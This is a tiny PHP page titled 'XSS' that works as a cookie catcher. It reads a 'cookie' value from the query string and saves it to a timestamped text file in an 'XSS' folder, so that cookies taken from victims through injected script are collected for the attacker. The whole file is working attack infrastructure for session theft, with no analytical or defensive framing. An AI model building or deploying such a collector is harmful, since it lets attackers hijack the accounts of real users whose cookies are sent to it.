<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XSS</title>
</head>
<body>
<?php
if(isset($_GET['cookie']) && !empty($_GET['cookie'])){
    date_default_timezone_set("Europe/Paris");

    $XSS = fopen('XSS/' . date("h:i:sa") . '.txt', 'w');
    fwrite($XSS, $_GET['cookie']);
    fclose($XSS);
}
?>
</body>
</html>
